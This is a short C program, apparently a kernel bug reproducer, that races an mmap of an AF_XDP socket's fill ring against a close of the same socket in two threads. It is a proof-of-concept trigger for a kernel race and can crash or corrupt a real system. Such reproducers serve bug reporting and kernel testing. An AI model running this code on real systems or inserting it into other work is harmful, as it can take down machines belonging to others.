/*BUG:Teardown race between memory mapping (mmap) and teardown (close) on an AF_XDP socket.*/
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/mman.h>
#include <pthread.h>

#ifndef AF_XDP
#define AF_XDP 44
#endif

int sock_fd;

void *thread_mmap(void *arg) {
    int size = 0x20000;
    setsockopt(sock_fd, 283, 5, &size, 4); 
    mmap(NULL, 0x1000, PROT_READ|PROT_WRITE, MAP_SHARED, sock_fd, 0x100000000ULL);
    return NULL;
}

void *thread_close(void *arg) {
    usleep(100);
    close(sock_fd);
    return NULL;
}

int main() {
    sock_fd = socket(AF_XDP, SOCK_RAW, 0);
    
    pthread_t t1, t2;
    pthread_create(&t1, NULL, thread_mmap, NULL);
    pthread_create(&t2, NULL, thread_close, NULL);
    
    pthread_join(t1, NULL);
    pthread_join(t2, NULL);
    
    return 0;
}